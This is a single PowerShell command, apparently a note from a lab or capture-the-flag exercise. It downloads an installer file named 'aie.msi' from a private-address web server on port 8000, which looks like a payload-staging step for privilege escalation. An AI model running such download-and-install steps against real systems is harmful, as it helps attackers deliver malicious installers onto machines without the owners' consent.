Invoke-WebRequest -Uri http://10.10.14.150:8000/aie.msi -OutFile aie.msi
